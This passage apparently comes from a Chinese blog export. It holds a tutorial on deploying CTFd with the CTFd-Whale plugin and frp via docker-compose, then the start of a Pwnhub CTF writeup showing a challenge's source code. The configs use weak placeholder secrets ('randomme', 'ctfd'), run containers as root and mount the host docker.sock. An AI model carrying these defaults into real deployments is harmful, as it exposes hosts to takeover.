sh\n```\n\ndocker-compose使用pip安装\n\n```\npip install docker-compose\n```\n\n安装成功用-v检查一下\n\n![](http://cdn.anyiblog.top/common/1681218058935-55cb9e32-5d7b-404b-bde7-a78614b910b8.png)\n\n### *4. apt换源 已经换过了可以略过这一步\n\n```\necho deb http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse > /etc/apt/sources.list\necho deb http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse >>/etc/apt/sources.list\necho deb http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse >>/etc/apt/sources.list\necho deb http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse >>/etc/apt/sources.list\necho deb http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse >>/etc/apt/sources.list\necho deb-src http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse >>/etc/apt/sources.list\necho deb-src http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse >>/etc/apt/sources.list\necho deb-src http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse >>/etc/apt/sources.list\necho deb-src http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse >>/etc/apt/sources.list\necho deb-src http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse >>/etc/apt/sources.list\n\napt-get update\n```\n\n\n\n## 部署需要\n\n（这里如果github下载太慢可以真机下载完后拖入虚拟机）\n\n### 1.下载CTFd源码（这里是赵师傅已经换源后的源码）\n\n```\ngit clone https://github.com/glzjin/CTFd.git\n```\n\n注：版本是v2.3.1，修改后的版本问题比较少，但是此版本支持的主题和汉化很少，几乎没有。（所以还是比较推荐CTFd3.0以上的版本）\n\n### 2.下载frp\n\n```\nwget https://github.com/fatedier/frp/releases/download/v0.29.0/frp_0.29.0_linux_amd64.tar.gz\n\ntar -zxvf frp_0.29.0_linux_amd64.tar.gz\nrm -rf frp_0.29.0_linux_amd64.tar.gz\n```\n\n### 3.下载CTFd-Whale\n\n```\ngit clone https://github.com/glzjin/CTFd-Whale ctfd-whale\n```\n\n### 4.下载docker的frps\n\n```\ngit clone https://github.com/glzjin/Frp-Docker-For-CTFd-Whale frp-docker-for-ctfd-whale\n```\n\n**确保CTFd-Whale docker-frps文件夹都是小写！**\n\n下载完后你的桌面应该是这四个文件夹。\n\n![](http://cdn.anyiblog.top/common/1681218066401-dc2cb486-f9ba-4417-b866-b5c019e5418f.png)\n\n\n# 部署过程\n\n## 1.docker设置集群\n\n这里一定要先记得设置集群，不然后面会报错。\n\n```\ndocker swarm init\n\ndocker node ls\n\ndocker node update --label-add name=linux-1 <节点 ID>\n```\n\n![](http://cdn.anyiblog.top/common/1681218066912-fc14ff49-a3fb-4fde-b01b-4cee65e23224.png)\n如果你输入 `docker swarm init` 出现以下报错，则代表你先前已经开过了\n\n![](http://cdn.anyiblog.top/common/1681218067263-801f20eb-d0c9-4f16-bd36-c9d6a222dd6f.png)\n使用 `docker swarm leave --force` 删除后，重复以上操作即可。\n\n## 2.将插件ctfd-whale放入ctfd文件夹\n\n```\nmv ctfd-whale CTFd/CTFd/plugins/\n```\n\n![](http://cdn.anyiblog.top/common/1681218067579-71c82f4c-5180-4072-a0cd-57d085a856eb.png)\n## 3.为docker安装frps\n\n注意这里frp不是装在你的服务器 你的虚拟机里的！是安装在你的docker容器里。\n\n这里进入`frp-docker-for-ctfd-whale` 为docker进行安装\n\n```\ncd frp-docker-for-ctfd-whale\ndocker-compose up -d\n```\n\n第一次安装需要等待一些时间。\n\n![](http://cdn.anyiblog.top/common/1681218067987-070bd31a-7bd8-4f67-bb03-feb92010bf27.png)\n看到done就是安装成功了。\n\n可以用 `docker ps` 来看看docker是否运行。\n\n![](http://cdn.anyiblog.top/common/1681218068368-61265a94-06a3-4faf-afcd-6936ebd81768.png)\n可以看到这里status是up，代表正在运行。\n\n\n\n**这一步到这里就结束了，如果要修改配置文件请继续往下看，不需要则可以跳至下一步了。**\n\ndocker-compose.yml\n\n```\nversion: '2'\n\nservices:\n  frps:\n    image: glzjin/frp:latest\n    restart: always\n    volumes:\n      - ./frp:/conf/\n    entrypoint:\n        - /usr/local/bin/frps\n        - -c\n        - /conf/frps.ini\n    ports:\n      - \"28000-28100:28000-28100\"     #这里是动态靶机的开放端口段，如需修改开放端口这里要修改。\n      - \"6490:6490\"    #这里如果要修改端口则必须与frps.ini配置一致\n    networks:\n        default:\n\nnetworks:\n    default:\n```\n\nfrps/frps.ini\n\n```\n[common]\nbind_port = 6490 #上面的端口如果改了，这里也要跟着改\ntoken = randomme #token不用动\n```\n\n*复制请注意将注释删除。\n\n## 4.CTFd配置\n\n为了和插件更好的兼容，这里要修改CTFd的docker配置文件 还要新增文件。\n\ncd到 `CTFd/` 路径下，对以下文件进行修改：\n\n\n\n### 1.docker-compose.yml\n\n```\nversion: '2.2'\n\nservices:\n  ctfd-nginx:\n    image: nginx:1.17\n    volumes:\n      - ./nginx/http.conf:/etc/nginx/nginx.conf   #这里注意\n    user: root\n    restart: always\n    ports:\n      - \"443:443\"\n    networks:\n        default:\n        internal:\n    depends_on:\n      - ctfd\n    cpus: '1.00'  #可改\n    mem_limit: 150M     #可改\n  ctfd:\n    build: .\n    user: root\n    restart: always\n    ports:\n      - \"8000:8000\"     #这里原本没开端口，直接打开访问网站速度会加快\n    environment:\n      - UPLOAD_FOLDER=/var/uploads\n      - DATABASE_URL=mysql+pymysql://root:ctfd@db/ctfd\n      - REDIS_URL=redis://cache:6379\n      - WORKERS=1\n      - LOG_FOLDER=/var/log/CTFd\n      - ACCESS_LOG=-\n      - ERROR_LOG=-\n      - REVERSE_PROXY=true\n    volumes:\n      - .data/CTFd/logs:/var/log/CTFd\n      - .data/CTFd/uploads:/var/uploads\n      - .:/opt/CTFd:ro\n      - /var/run/docker.sock:/var/run/docker.sock     #这里是添加的\n    depends_on:\n      - db\n    networks:\n        default:\n        internal:\n        frp:\n            ipv4_address: 172.1.0.2\n    cpus: '1.00'     #可改\n    mem_limit: 450M     #可改\n\n  db:\n    image: mariadb:10.4\n    restart: always\n    environment:\n      - MYSQL_ROOT_PASSWORD=ctfd\n      - MYSQL_USER=ctfd\n      - MYSQL_PASSWORD=ctfd\n    volumes:\n      - .data/mysql:/var/lib/mysql\n    networks:\n        internal:\n    # This command is required to set important mariadb defaults\n    command: [mysqld, --character-set-server=utf8mb4, --collation-server=utf8mb4_unicode_ci, --wait_timeout=28800, --log-warnings=0]\n    cpus: '1.00'     #可改\n    mem_limit: 750M     #可改\n\n  cache:\n    image: redis:4\n    restart: always\n    volumes:\n      - .data/redis:/data\n    networks:\n        internal:\n    cpus: '1.00'     #可改\n    mem_limit: 450M     #可改\n\n  frpc:    \n    image: glzjin/frp:latest\n    restart: always\n    volumes:\n      - ./frpc:/conf/     #这里注意\n    entrypoint:\n        - /usr/local/bin/frpc\n        - -c\n        - /conf/frpc.ini\n    networks:\n        frp:\n            ipv4_address: 172.1.0.3  #记住此处\n        frp-containers:\n    cpus: '1.00'     #可改\n    mem_limit: 250M     #可改\n\nnetworks:\n    default:\n    internal:\n        internal: true\n    frp:\n        driver: bridge\n        ipam:\n            config:\n                - subnet: 172.1.0.0/16\n    frp-containers:\n        driver: overlay\n        internal: true\n        ipam:\n            config:\n                - subnet: 172.2.0.0/16\n```\n\n\n\n### 2.nginx/http.conf\n\n**新建nginx文件夹，并创建http.conf文件**，并将以下内容添加进去。\n\n```\nmkdir nginx\nvim nginx/http.conf\n```\n\n```\nworker_processes 4;\nevents {\n  worker_connections 1024;\n}\nhttp {\n  # Configuration containing list of application servers\n  upstream app_servers {\n    server ctfd:8000;\n  }\n  server {\n    listen 80;\n    client_max_body_size 4G;\n    # Handle Server Sent Events for Notifications\n    location /events {\n      proxy_pass http://app_servers;\n      proxy_set_header Connection '';\n      proxy_http_version 1.1;\n      chunked_transfer_encoding off;\n      proxy_buffering off;\n      proxy_cache off;\n      proxy_redirect off;\n      proxy_set_header Host $host;\n      proxy_set_header X-Real-IP $remote_addr;\n      proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;\n      proxy_set_header X-Forwarded-Host $server_name;\n    }\n    # Proxy connections to the application servers\n    location / {\n      proxy_pass http://app_servers;\n      proxy_redirect off;\n      proxy_set_header Host $host;\n      proxy_set_header X-Real-IP $remote_addr;\n      proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;\n      proxy_set_header X-Forwarded-Host $server_name;\n    }\n  }\n}\n```\n\n添加完成:wq保存即可。\n\n\n\n### 3.frpc/\n\n在`CTFd/`目录下创建`frpc`文件夹，并将解压的`frp_0.29.0_linux_amd64`文件夹移动文件。\n\n```\nmkdir frpc\ncd ../frp_0.29.0_linux_amd64\nmv frpc frpc.ini frpc_full.ini LICENSE ../CTFd/frpc\n```\n\n进入到frpc文件夹，对**frpc.ini**进行修改：\n\n```\ncd ../CTFd/frpc\nvim frpc.ini\n```\n\n```\n[common]\ntoken = randomme\nserver_addr = 172.1.0.4\nserver_port = 6490\npool_count = 200\ntls_enable = true\n\nadmin_addr = 172.1.0.3\nadmin_port = 7400\n```\n\n这里**server_port必须与frpc.ini配置一致**，且一定**要添加admin_addr和admin_port**，这里都已经满足条件了。\n\n**这里配置文件一定不能有注释，否则会导致docker运行一直restart**\n\n![](http://cdn.anyiblog.top/common/1681218068727-736515b1-142a-467c-bb99-844107b2eb39.png)\n像我这样配置完后保存退出即可。\n\n\n\n### 4.requirements.txt\n\n官方的requeirements.txt很多版本会存在问题，所以替换成以下文件即可：\n\n```\nFlask==1.1.2\nWerkzeug==0.16.0\nFlask-SQLAlchemy==2.4.1\nFlask-Caching==1.4.0\nFlask-Migrate==2.5.2\nFlask-Script==2.0.6\nSQLAlchemy==1.3.11\nSQLAlchemy-Utils==0.36.0\npasslib==1.7.2\nbcrypt==3.1.7\nsix==1.13.0\nitsdangerous==1.1.0\njinja2==2.11.3\nrequests>=2.20.0\nPyMySQL==0.9.3\ngunicorn==19.9.0\nnormality==2.0.0\ndataset==1.1.2\nmistune==0.8.4\nnetaddr==0.7.19\nredis==3.3.11\ndatafreeze==0.1.0\ngevent==21.12.0\npython-dotenv==0.10.3\nflask-restplus==0.13.0\npathlib2==2.3.5\nflask-marshmallow==0.10.1\nmarshmallow-sqlalchemy==0.17.0\nboto3==1.10.39\nmarkupsafe==1.1.1\nmarshmallow==2.20.2\n```\n\n![](http://cdn.anyiblog.top/common/1681218069115-0792c26e-b151-4923-87c8-9ee3fbede421.png)\n\n\n## 5.配置Dokcerfile\n\n编辑`CTFd/`路径下的`Dockerfile`文件，注意这里的配置文件是v2.x都适用的，到3.0之后的新版本要换一个新写法。\n\n### 版本v2.x写法\n\n```\nFROM python:3.7-alpine\nRUN sed -i 's/dl-cdn.alpinelinux.org/mirrors.ustc.edu.cn/g' /etc/apk/repositories && \\\n    apk update && \\\n    apk add linux-headers libffi-dev gcc make musl-dev py-pip mysql-client git openssl-dev   #这里注意1\nRUN adduser -D -u 1001 -s /bin/bash ctfd\n\nWORKDIR /opt/CTFd\nRUN mkdir -p /opt/CTFd /var/log/CTFd /var/uploads\n\nCOPY requirements.txt .\n\nRUN pip install -r requirements.txt -i https://mirrors.tuna.tsinghua.edu.cn/pypi/web/simple/   #这里注意2\n\nCOPY . /opt/CTFd\n\nRUN for d in CTFd/plugins/*; do \\\n      if [ -f \"$d/requirements.txt\" ]; then \\\n        pip install -r $d/requirements.txt -i https://mirrors.tuna.tsinghua.edu.cn/pypi/web/simple/ ; \\\n      fi; \\\n    done; #同样注意2\n\nRUN chmod +x /opt/CTFd/docker-entrypoint.sh\nRUN chown -R 1001:1001 /opt/CTFd\nRUN chown -R 1001:1001 /var/log/CTFd /var/uploads\n\nUSER 1001\nEXPOSE 8000\nENTRYPOINT [\"/opt/CTFd/docker-entrypoint.sh\"]\n```\n\n\n\n### *新版CTFd的写法（v2.x的可以略过了）\n\n```\nFROM python:3.7-slim-buster\nWORKDIR /opt/CTFd\nRUN mkdir -p /opt/CTFd /var/log/CTFd /var/uploads\n\n# hadolint ignore=DL3008\nRUN echo 'deb http://mirrors.aliyun.com/debian/ buster main non-free contrib \\\n deb http://mirrors.aliyun.com/debian/ buster-updates main non-free contrib \\\n deb http://mirrors.aliyun.com/debian/ buster-backports main non-free contrib \\\n deb-src http://mirrors.aliyun.com/debian/ buster main non-free contrib \\\n deb-src http://mirrors.aliyun.com/debian/ buster-updates main non-free contrib \\\n deb-src http://mirrors.aliyun.com/debian/ buster-backports main non-free contrib \\\n deb http://mirrors.aliyun.com/debian-security/ buster/updates main non-free contrib \\\n deb-src http://mirrors.aliyun.com/debian-security/ buster/updates main non-free contrib'> /etc/apt/sources.list && \\\n    apt-get update \\\n    && apt-get install -y --no-install-recommends \\\n        build-essential \\\n        default-mysql-client \\\n        python3-dev \\\n        libffi-dev \\\n        libssl-dev \\\n        git \\\n    && apt-get clean \\\n    && rm -rf /var/lib/apt/lists/*\n\nCOPY requirements.txt /opt/CTFd/\n\nRUN pip install -r requirements.txt -i http://mirrors.aliyun.com/pypi/simple/ --no-cache-dir\n\nCOPY . /opt/CTFd\n\n# hadolint ignore=SC2086\nRUN for d in CTFd/plugins/*; do \\\n        if [ -f \"$d/requirements.txt\" ]; then \\\n            pip install -r $d/requirements.txt -i http://mirrors.aliyun.com/pypi/simple/ --no-cache-dir; \\\n        fi; \\\n    done;\n\nRUN adduser \\\n    --disabled-login \\\n    -u 1001 \\\n    --gecos \"\" \\\n    --shell /bin/bash \\\n    ctfd\nRUN chmod +x /opt/CTFd/docker-entrypoint.sh \\\n    && chown -R 1001:1001 /opt/CTFd /var/log/CTFd /var/uploads\n\nUSER 1001\nEXPOSE 8000\nENTRYPOINT [\"/opt/CTFd/docker-entrypoint.sh\"]\n```\n\n\n\n![](http://cdn.anyiblog.top/common/1681218069552-14d9f5e3-b2ac-4d05-b5c6-20c3679bd2cb.png)\n编辑完退出即可。\n\n\n\n## 6.开启部署\n\n准备工作已就绪，剩下的直接交给docker去build构建即可\n\n**一定要切换到 `CTFd` 路径下**，执行：（这一句话等同于docker-compose build + docker-compose up -d）\n\n```\ndocker-compose up -d --build\n```\n\n（有安装卡住的部分ctrl+c后重新运行下就好）\n\n![](http://cdn.anyiblog.top/common/1681218070255-c89d5d34-c368-4e28-a275-bfe5514725b0.png)\n如图所示，有WARNING即为在集群网络类，是正常情况\n\n![](http://cdn.anyiblog.top/common/1681218071071-8ba23c95-2661-4277-976c-196e6b21ddb8.png)\n这边显示done就是开启成功了，等待安装完成后，查看容器是否运行：\n\n```\ndocker ps\n```\n\n![](http://cdn.anyiblog.top/common/1681218071499-c066283d-12d6-4fe1-b8a3-a05bf98b5e81.png)\n可以看到这里平台已经映射到了真机的8000端口了\n\n访问 **http://ip:8000/** 即可访问搭建好的CTFd平台了。\n\n![](http://cdn.anyiblog.top/common/1681218071862-b4a2a61b-02cd-4e35-85dc-3f6b5684e619.png)\n## 7.配置CTFd\n\n### 1.初始化\n\n刚搭好平台，要初始化设置一下，这里跟着我设置即可。\n\n设置错了也没关系，后续在后台也能修改。\n\n![](http://cdn.anyiblog.top/common/1681218072208-a036d3c4-cac8-4bf3-a415-42a486233ec4.png)\n![](http://cdn.anyiblog.top/common/1681218072578-d1595e7f-f937-416f-83ac-818953341edb.png)\n![](http://cdn.anyiblog.top/common/1681218072929-db9d423b-2224-4516-a195-45863d20d5c7.png)\n![](http://cdn.anyiblog.top/common/1681218073644-5f02a911-a1ea-4df6-a790-b2118bc36591.png)\n### 2.配置CTFd-Whale\n\n设置好后进入后台 `Admin Panel ` 找到 `Plugins -> ctfd-whale`\n\n![](http://cdn.anyiblog.top/common/1681218074041-2ae4b1ac-00af-4f47-8cd8-2225132ddc5b.png)\n![](http://cdn.anyiblog.top/common/1681218074506-0c4c57e4-efc1-42ab-b75e-5a109588d681.png)\n\n\n| 属性                                             | 配置                                  |\n| ------------------------------------------------ | ------------------------------------- |\n| Docker API URL                                   | unix://var/run/docker.sock            |\n| Frp API IP                                       | frpc的ip配置                          |\n| Frp API Port                                     | frpc的端口配置                        |\n| Frp Http Domain Suffix                           | Docker API URL to connect（可填None） |\n| Frp Http Port                                    | 80                                    |\n| Frp Direct IP Address                            | 你的公网ip                            |\n| Frp Direct Minimum Port                          | 与之前frps最小端口呼应                |\n| Frp Direct Minimum Port                          | 与之前frps最大端口呼应                |\n| Max Container Count                              | 不超过最大-最小                       |\n| Max Renewal Times                                | 最大实例延时次数                      |\n| Frp config template                              | 填入frps的配置，只需填[common]        |\n| Docker Auto Connect Containers                   | ctfd_frpc_1                           |\n| Docker Dns Setting                               | 可填机器内DNS，没有可填个外网DNS      |\n| Docker Swarm Nodes                               | linux-1 与前面swarm集群呼应           |\n| Docker Multi-Container Network Subnet            | 内网题大子网ip配置/CIDR               |\n| Docker Multi-Container Network Subnet New Prefix | 每个内网题实例的CIDR                  |\n| Docker Container Timeout                         | 单位为秒                              |\n\n按照图片的来配置即可\n\n![](http://cdn.anyiblog.top/common/1681218074929-1f0bec1c-9215-4419-a2d3-9e9255ceee29.png)\n![](http://cdn.anyiblog.top/common/1681218075350-87f9debf-1bbb-41e6-bf25-5a28165e50f7.png)\n\n\n配置好了后记得点击 **update** 更新\n\n\n\n## 8.设置docker网络\n\n此时运行 `docker ps` 能发现frpc在一直重启\n\n![](http://cdn.anyiblog.top/common/1681218075803-4bb22ec8-6f54-4f6c-8741-9fd7fe948a84.png)\n这是因为我们还没有配置网络\n\n运行 `docker network ls`\n\n![](http://cdn.anyiblog.top/common/1681218076210-2c64ff58-2f8f-4455-b83d-029ef2bdd47f.png)\n显示ctfd_frp-containers\n\n运行 `docker network inspect ctfd_frp` 查看网络情况\n\n![](http://cdn.anyiblog.top/common/1681218076646-45c41517-8c2b-44c5-88c0-e9755668e68f.png)\n能发现这里只有ctfd，没有接入frpc和frps，先用`docker ps`分别找到frps和frpc的ID\n\n![](http://cdn.anyiblog.top/common/1681218077074-29ff7ae1-0b26-4015-8767-062d6a3b18bb.png)\n我这里两个是 `frpc:6a7a98e8cd38`  `frps:5192ccf2c8cb`\n\n然后使用`docker network connect ctfd_frp <frp容器id>` 连接\n\n```\ndocker network connect ctfd_frp 6a7a98e8cd38\ndocker network connect ctfd_frp 5192ccf2c8cb\n```\n\n此时再查看网络情况`docker network inspect ctfd_frp` 能发现多了frpc和frps\n\n![](http://cdn.anyiblog.top/common/1681218077505-af5abd8e-cf7c-4873-ac04-5ecb1ab1423a.png)\n\n\n重启docker网络：\n\n```\ndocker restart ctfd_frpc_1 frp-docker-for-ctfd-whale_frps_1\n```\n\n![](http://cdn.anyiblog.top/common/1681218077874-1db5335a-3c51-4277-9f36-52b3fed5a0a0.png)\n最后docker ps验证下，能发现frpc可以一直运行了。\n\n![](http://cdn.anyiblog.top/common/1681218078227-ee6000fd-9f70-4147-a419-bdfd45f8c619.png)\n修复成功。\n\n## 9.部署完毕，新建题目测试\n\n如果做到这一步 过程都成功了，那么恭喜你已经成功搭建了CTFd和CTFd-Whale插件了，现在进行题目的测试。\n\n后台创建题目：\n\n![](http://cdn.anyiblog.top/common/1681218078559-5b50d07c-16f9-4f2c-bad0-cbcac892fd9d.png)\n然后贴下赵总的图：\n\n![](http://cdn.anyiblog.top/common/1681218079054-cbe0707c-fb51-4387-88ab-e4b72ef93548.png)\n![](http://cdn.anyiblog.top/common/1681218079771-15d19f92-923e-470f-b993-734cbcbee277.png)\n![](http://cdn.anyiblog.top/common/1681218080212-441c69d1-48c2-43cf-95e5-e0151feb993e.png)\n这里直接用 `ctftraining/qwb_2019_supersqli` dockerhub的镜像来测试\n\n创建成功后 再添加flag和题目显示情况即可 （这些选项在后台的题目详情也可以添加、修改）\n\n![](http://cdn.anyiblog.top/common/1681218080548-ef3b9082-552f-42c4-b8ac-e754af9ee642.png)\n\n\n完成后就在 `Challenges` 点击题目测试\n\n![](http://cdn.anyiblog.top/common/1681218080903-c83179f6-02df-4d0b-8b64-d2ff8788abef.png)\n开启靶机，访问靶机端口（第一次开启可能会等的比较久）：\n\n![](http://cdn.anyiblog.top/common/1681218081254-b40fbc45-1db7-4f74-b081-1df4fa865e81.png)\n可以看到成功开启来了，docker ps也能看到docker运行状况：\n\n![](http://cdn.anyiblog.top/common/1681218081596-d9984549-9d51-4619-b18b-ddbe291f9cf2.png)\n\n\n# 一键部署脚本\n\n这个脚本是我自己写的，为了方便一键开启CTFd，适用于访问ip不到网站的情况下，使用python3运行大概率可以开启服务。\n\n临时写的，比较糙 不过效果还可以 大多都是能开起来的。\n\n## 使用方法\n\n将脚本放入你的`CTFd`文件夹，使用python3运行即可\n\n```\npython3 start.py\n```\n\n\n\n## start.py\n\n```python\nimport os\nimport re\n\ndef shutdown():\n    cmd = 'docker-compose down'\n    os.system(cmd)\n\ndef start():\n    cmd = \"docker-compose up -d\"\n    os.system(cmd)\n\ndef check():\n    cmd = 'docker ps'\n    r = ''\n    for i in os.popen(cmd):\n        #print(i)\n        r += i\n    return r\n\ndef network():\n    c1 = \"docker network inspect ctfd_frp\"\n    r = ''\n    for i in os.popen(c1):\n        #print(i)\n        r += i\n    return r\n\ndef connect(id):\n    c1 = f\"docker network connect ctfd_frp {id}\"\n    os.system(c1)\n\ndef restart():\n    c1 = 'docker restart ctfd_frpc_1 frp-docker-for-ctfd-whale_frps_1'\n    os.system(c1)\n\n\nos.system('docker network disconnect -f ctfd_frp frp-docker-for-ctfd-whale_frps_1')\n\nprint(f'[*] Restarting!')\n\nshutdown()\nstart()\ncontent = check()\nctfdid = re.findall('\\n(.*?)   ctfd_ctfd',content)[-1]\n\nprint(f'[*] Now checking network!')\n\ncmd = f'docker exec -it {ctfdid} python -c \\'import requests;r = requests.get(\"http://172.1.0.3:7400/api/reload\");print(r)\\''\nr = ''\nfor i in os.popen(cmd):\n    r += i\nif 'Connection refused' in r:\n    print(f'[*] network fixing')\n    c2 = network()\n    if 'frp-docker-for-ctfd-whale_frps_1' not in c2:\n        content = check()\n        frpsid = re.findall('(.*?)   frp-docker-for-ctfd-whale_frps_1',content)[0].split('glzjin/frp:latest')[0].strip()\n        connect(frpsid)\n        print(f'[+] frps append in ctfd success!')\n    restart()\n    f = open('frpc/frpc.ini','w')\n    main=\"\"\"[common]\ntoken = randomme\nserver_addr = 172.1.0.4\nserver_port = 6490\npool_count = 200\ntls_enable = true\n\nadmin_addr = 172.1.0.3\nadmin_port = 7400\n\"\"\"\n    f.write(main)\n    f.close()\n    print(f'[+] Config(frpc.ini) overwriting success!')\n    os.system('docker restart ctfd_frpc_1')\n    r = ''\n    for i in os.popen(cmd):\n        r += i\nif '<Response [200]>' in r:\n    print('[+] Start Success!')\n```\n\n\n\n\n\n# 一些值得注意的地方\n\n## 帮助调试的命令\n\n\n\n```\ndocker ps #获取容器ID\n```\n\n\n\n```\ndocker logs <ID> #查看一个docker容器的运行日志\n```\n\n*如果容器一直处于restart的状态，使用这条命令查看其运行情况，再根据报错去网上查询，非常有效且高效！\n\n\n\n```\ndocker exec -it <ID> sh #进入一个容器，查看内部情况\n```\n\n\n\n```\ndocker network prune -f #删除未使用的网络，适用于重启服务某些网络未关闭的情况\n```\n\n\n\n## 疑难杂症\n\n如果docker容器无法启动或者frp端口无法映射可以进容器检查\n\n确保docker api填写正确，如docker-compose.yml中写的unix:///var/run/docker.sock\n你也可以使用端口形式的api如[官方示例](https://success.docker.com/article/how-do-i-enable-the-remote-api-for-dockerd)：可以用IP：端口指定API\n\n### docker容器无法启动问题\n\n进入容器检查：\n\n```none\ndocker exec -it <ctfd容器id> sh\n/opt/CTFd# python\n>>>import docker\n>>>client=docker.DockerClient(base_url=\"unix:///var/run/docker.sock\")\n>>>client.images.list()\n```\n\n如果api正确会列出所有镜像\n\n\n\n### frp端口无法映射问题\n\n进入容器检查：\n\n```none\n//其实检查可以顺便检查一下上面的，因为都在ctfd容器内\ndocker exec -it <ctfd容器id> sh\n/opt/CTFd# python\n>>>import requests\n>>>requests.get(\"http://172.1.0.3:7400/api/reload\")//即frp api的地址\n\n返回\n<Response [200]> #表示成功\n```\n\n\n\n如果frpc还是出现如下问题\n\n```none\nrequests.exceptions.ConnectionError: HTTPConnectionPool(host='172.1.0.3', port=7400): Max retries exceeded with url: /api/reload (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7f8df919f850>: Failed to establish a new connection: [Errno 111] Connection refused'))\n```\n\n\n\n则重新配置frpc。编辑CTFd/frpc/frpc.ini\n\n```none\n[common]\ntoken = randomme\nserver_addr = 172.1.0.4\nserver_port = 6490\npool_count = 200\ntls_enable = true\n\nadmin_addr = 172.1.0.3\nadmin_port = 7400\n```\n\n\n\n然后运行`docker restart ctfd_frpc_1`（这里再看frpc.ini会发现内容更新了，admin配置没了，不用担心）\n\n再进容器检查`requests.get(\"http://172.1.0.3:7400/api/reload\")`应该就可以了`<Response [200]>`\n\n\n\n# frp端口冲突\n\n如果发现frp端口冲突，请检查本地frpc或者frps服务，frp是在docker上**不是在本地**的！\n\n```\nsystemctl stop frpc\nsystemctl stop frps\n```\n\n\n\n# 部署成功\n\n如果到这一步都没有出现问题，非常恭喜你，CTFd和动态靶机部署已经成功搭建。\n\n这篇文章就到此结束了，下一篇文章是关于平台的后续工作：平台的美化、优化、题目镜像制作等。\n\n感谢你的观看，希望能帮到你！也可以在这篇文章评论进行讨论问题\n\n\n\n# 参考文章\n\n这里我贴出几个对我有帮助的文章，非常详细！我的这篇文章都是结合各位师傅的教程和经验总结出来的。\n\n```\nhttps://err0r.top/article/CTFD/ \n\nhttps://www.zhaoj.in/read-6333.html（赵师傅官方文章）\n\nhttps://www.yuque.com/dat0u/ctfd\n```\n\n\n\n","tags":["CTF","干货","教程","CTFd搭建"],"categories":["干货","CTFd"]},{"title":"Pwnhub冬季赛Other方向writeup","url":"/2022/12/19/20221219/","content":"\n# 前言\n\n有幸也是拿到了other下三道题目的一血，来写下wp。\n\n![](http://cdn.anyiblog.top/common/1671450896999-925af883-bdbb-49f2-97c6-3dcde1c8a963.png)\n\n![](http://cdn.anyiblog.top/common/1671450454208-e48086be-f92a-41b0-a39c-2a44b40a96e5.png)  \n![](http://cdn.anyiblog.top/common/1671450455114-8d49d7a6-2ed1-4d29-885d-f79ca817c1a9.png)\n![](http://cdn.anyiblog.top/common/1671450455749-ac255b8f-a793-480f-ab1a-b7982107614f.png)  \n\n# 文字频率分析\n  \n下载附件得到题目源码\n  \n```\nimport os\nimport random\nimport base64\nimport time\nfrom PIL import Image, ImageDraw, ImageFont, ImageFilter\nimport io\nfrom secret import flag\nimport hashlib\n  \n  \ndef pow(hard_level = 6):\n    if hard_level >= 30:\n        hard_level = 30\n  \n  \n    m = hex(random.getrandbits(16 * 8))[2:]\n    c = hashlib.md5(m.encode()).hexdigest()\n    part = m[:32 - hard_level]\n    print(f'plaintext: {part}' + '?' * hard_level)\n    print(f'md5_hex -> {c}')\n    return part, c\n  \n  \ndef crack(part, c, level = 6):\n    s = int(part, 16) << (level * 4)\n    _limit = s + (1 << level * 4)\n    while s <= _limit:\n        s += 1\n        seed = hex(s)[2:].encode()\n        if hashlib.md5(seed).hexdigest() == c:\n            return seed\n  \n  \ndef getData(nums = 400):\n    data = []\n    result = [0 for _ in range(26)]\n    for i in range(nums):\n        c = random.randint(0, 25)\n        data.append(c)\n        result[c] += 1\n    result = [str(i) for i in result]\n    return data, result\n  \n  \ndef makeImage(data = [], size = 20):\n    img = Image.new('RGB', (size * 50, size * 50))\n    for y in range(size):\n        for x in range(size):\n            img.paste(pngs[data[x + y * size]], (x * 50, y * 50))\n    content = io.BytesIO()\n    img.save(content, 'png')\n    img.save('flag.png')\n    img.close()\n    return content.getvalue()\n  \n  \ndef game():\n    print(\"Easy pow:\")\n    pm, c = pow()\n    m = input(\"What's is plaintext?\\n> \")\n    if hashlib.md5(m.encode()).hexdigest() != c:\n        print('Failed')\n        return\n  \n  \n    data, result = getData()\n    png = makeImage(data)\n    print('now, you get a png: ')\n    print(base64.b64encode(png).decode())\n    print(\"##The end, please tell me your list:\")\n    _start = time.time()\n    _input = input('> ').split(',')\n    _end = time.time()\n  \n  \n    if _end - _start > 10:\n        print('timeouted')\n        return\n  \n  \n    if _input == result:\n        print(\"Got it!\")\n        print(flag)\n    else:\n        print('Sorry, try again.')\n  \n  \nif __name__ == '__main__':\n    print('loading pngs, please waiting...')\n    pngs = []\n    seed = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'\n    for i in range(26):\n        pngs.append(Image.open(f'/app/src/{seed[i]}.png').resize((50, 50), Image.ANTIALIAS))\n    game()\n  \n  \n```\n  \n以及图片\n  \n![](http://cdn.anyiblog.top/common/1671450458714-43af0b2f-175d-4c16-8dfc-9f93b6b933fa.png)  \n分析源码，能得知做了以下几件事：\n  \n1.   随机获取字符串并截取，并给出md5，要求我们还原字符串\n    \n2.  还原后，脚本以26字母表的顺序对应题目给的图片，进行随机的选取400次图片，并拼成大图，以base64的形式展现给我们\n    \n3.  要求我们通过大图来还原每张图片出现的频率，以字母表的顺序排序。最后要求我们输入频率的序列进行对比，正确则得到flag\n    \n  \n刚开始爆破md5后，得到base64字符串还原得到这张图片：\n  \n![](http://cdn.anyiblog.top/common/1671450460158-b14adf49-3329-4455-880d-2c37cbbc667e.png)  \n每张小图50\\*50大小，共1000\\*1000的大小。\n  \n所以我的思路，先是分辨：通过PIL模块分割小图，先取26张不重样的图片，对照字母表进行一个分辨最后保存到文件夹里。\n  \n之后进行批量识别：创建一个26位的列表，分割大图为小图，与先前保存好的图片进行比对（用getdata），将相同的图片根据辨别好的字母表找到对应的索引，添加到列表的下标。最后打印列表就是题目的答案了。\n  \n一把梭脚本：\n  